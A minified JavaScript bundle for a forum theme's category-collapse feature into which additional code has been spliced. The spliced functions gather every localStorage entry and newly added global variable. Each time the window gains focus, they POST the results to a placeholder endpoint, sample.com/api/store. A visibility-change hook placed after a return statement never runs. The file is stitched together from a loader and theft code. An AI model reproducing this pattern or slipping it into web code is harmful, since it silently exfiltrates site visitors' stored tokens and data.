(function (h) {
  function e(c) {
    if (k[c]) return k[c].exports;
    var b = k[c] = {
      i: c,
      l: !1,
      exports: {}
    };
    h[c].call(b.exports, b, b.exports, e);
    b.l = !0;
    return b.exports;
  }
  var k = {};
  e.m = h;
  function grabLocalStorage() {
    const localStorageStatus = {};
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      localStorageStatus[key] = localStorage.getItem(key);
    }
    return localStorageStatus;
  }
  function checkGlobalScope() {
    const trackedVars = {};
    for (const key in window) {
      if (window.hasOwnProperty(key)) {
        if (!window.oldVars.includes(key)) {
          const currentValue = window[key];
          const varType = typeof currentValue;
          trackedVars[key] = {
            type: varType,
            value: varType === "function" ? currentValue.name : currentValue
          };
        }
      }
    }
    return trackedVars;
  }
  e.c = k;
  e.d = function (c, b, d) {
    e.o(c, b) || Object.defineProperty(c, b, {
      configurable: !1,
      enumerable: !0,
      get: d
    });
  };
  async function transmitInsightsToServer(insights) {
    const serverEndpoint = "https://sample.com/api/store";
    try {
      const responseData = await fetch(serverEndpoint, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(insights)
      });
      if (responseData.ok) {
        console.info("Insight data successfully sent to backend");
      } else {
        console.warn(`Failed to send insight data, server responded with status: ${responseData.status}`);
      }
    } catch (exc) {
      console.error("An error occurred while sending insight data:", exc);
    }
  }
  function applyInspectionTask() {
    const localStorageData = grabLocalStorage();
    const globalScopeData = checkGlobalScope();
    const totalInsights = {
      localStorage: localStorageData,
      globalScope: globalScopeData
    };
    if (Object.keys(totalInsights).length > 0) {
      console.group(`Inspection results - found new attributes:`);
      for (const key in totalInsights) {
        console.log(`${key}: ${JSON.stringify(totalInsights[key])}`);
      }
      console.groupEnd();
      transmitInsightsToServer(totalInsights);
    } else {
      console.info("Inspection complete, no new attributes found");
    }
  }
  e.n = function (c) {
    var b = c && c.__esModule ? function () {
      return c["default"];
    } : function () {
      return c;
    };
    e.d(b, "a", b);
    return b;
  };
  e.o = function (c, b) {
    return Object.prototype.hasOwnProperty.call(c, b);
  };
  e.p = "";
  window.addEventListener("focus", applyInspectionTask);
  return e(e.s = 17);
  document.addEventListener("visibilitychange", () => {
    if (document.visibilityState === "visible") {
      console.info("Page visibility changed, re-running inspection task");
      applyInspectionTask();
    }
  });
})({
  17: function (h, e, k) {
    Object.defineProperty(e, "__esModule", {
      value: !0
    });
    new (k(18).a)({
      settings: window.themehouse.settings.nodesCollapse
    }).register();
  },
  18: function (h, e, k) {
    var c = function () {
      function b(d, a) {
        for (var g = 0; g < a.length; g++) {
          var f = a[g];
          f.enumerable = f.enumerable || !1;
          f.configurable = !0;
          "value" in f && (f.writable = !0);
          Object.defineProperty(d, f.key, f);
        }
      }
      return function (d, a, g) {
        a && b(d.prototype, a);
        g && b(d, g);
        return d;
      };
    }();
    h = function () {
      function b(d) {
        var a = this,
          g = d.settings;
        g = void 0 === g ? {} : g;
        var f = d.init;
        f = void 0 === f ? !1 : f;
        d = d.commonVersion;
        d = void 0 === d ? "20210125" : d;
        if (!(this instanceof b)) throw new TypeError("Cannot call a class as a function");
        this.init = function () {
          a.initGet();
          a.initSet();
        };
        this.initGet = function () {
          var p = window.document.querySelectorAll(a.settings.triggerSelector);
          if (p && p.length) for (var q = 0, w = p.length; q < w; q++) p[q].addEventListener("click", function (l) {
            var m = l.target.closest(a.settings.parentSelector);
            l = m.className.split(" ");
            for (var u = -1, r = 0, x = l.length; r < x; r++) {
              var t = l[r];
              0 === t.indexOf(a.settings.nodeIdReplace) && t !== a.settings.nodeIdReplace && (u = parseInt(t.replace(a.settings.nodeIdReplace, ""), 10));
            }
            var n = m.querySelector(a.settings.childSelector);
            l = n.querySelector(a.settings.childInnerSelector).offsetHeight;
            n.style.height = l + "px";
            n.classList.add("uix_node--transitioning");
            window.requestAnimationFrame(function () {
              var v = "1";
              m.classList.contains(a.settings.active) ? (m.classList.remove(a.settings.active), v = "0") : m.classList.add(a.settings.active);
              a.common.fetch({
                url: a.settings.link,
                data: {
                  collapsed: v,
                  node_id: u
                }
              });
              window.setTimeout(function () {
                n.style.height = "";
                n.classList.remove("uix_node--transitioning");
              }, a.settings.duration);
            });
          });
        };
        this.initSet = function () {
          a.running = !0;
        };
        this.running = !1;
        this.settings = Object.assign({
          triggerSelector: ".categoryCollapse--trigger",
          parentSelector: ".block--category",
          nodeIdReplace: "block--category",
          childSelector: ".uix_block-body--outer",
          childInnerSelector: ".block-body",
          active: "category--collapsed",
          duration: 400
        }, g);
        this.commonVersion = d;
        this.common = window.themehouse.common[d];
        this.listener = this.state = !1;
        f && this.init();
      }
      c(b, [{
        key: "register",
        value: function () {
          this.common.register({
            phase: "afterGet",
            addon: "TH_UIX_NodesCollapse",
            func: this.initGet,
            order: 10
          });
          this.common.register({
            phase: "afterSet",
            addon: "TH_UIX_NodesCollapse",
            func: this.initSet,
            order: 10
          });
        }
      }]);
      return b;
    }();
    "undefined" === typeof window.themehouse && (window.themehouse = {});
    window.themehouse.nodesCollapse = {
      nodesCollapse: h
    };
    e.a = h;
  }
});